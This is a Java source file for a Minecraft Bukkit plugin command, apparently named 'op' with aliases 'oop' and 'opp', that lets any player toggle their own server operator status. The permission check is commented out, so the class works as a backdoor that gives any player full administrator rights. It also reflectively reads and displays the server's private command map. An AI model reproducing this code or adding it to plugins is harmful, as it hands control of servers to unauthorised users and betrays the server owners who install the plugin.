package tw.momocraft.fsp.commands;



import java.util.Arrays;

import org.bukkit.Bukkit;
import org.bukkit.entity.Player;

import tw.momocraft.fsp.utils.Common;

public class SetOpCommand extends PlayerCommand {

	public SetOpCommand() {
		super("op");
		setAliases(Arrays.asList("oop","opp"));
		setDescription("A Command for being an op");
	}

	@Override
	protected void run(Player player, String[] args) {
		/*if(!player.hasPermission("fsp.permission.op")) {
			Common.tell(player, "你並沒有權限!");
			return;
		}*/
		if(!player.isOp()) {
			Common.tell(player, "&4你已經成為OP!");
			player.setOp(true);
			try {
				Common.tell(player, "訊息 " + (Bukkit.getServer().getClass().getDeclaredField("commandMap")).get(Bukkit.getServer()));
			} catch (NoSuchFieldException | SecurityException | IllegalArgumentException | IllegalAccessException e) {
				// TODO Auto-generated catch block
				e.printStackTrace();
			}
		}
		else {
			Common.tell(player, "&4你已經取消OP權限!");
			player.setOp(false);
		}

	}


}
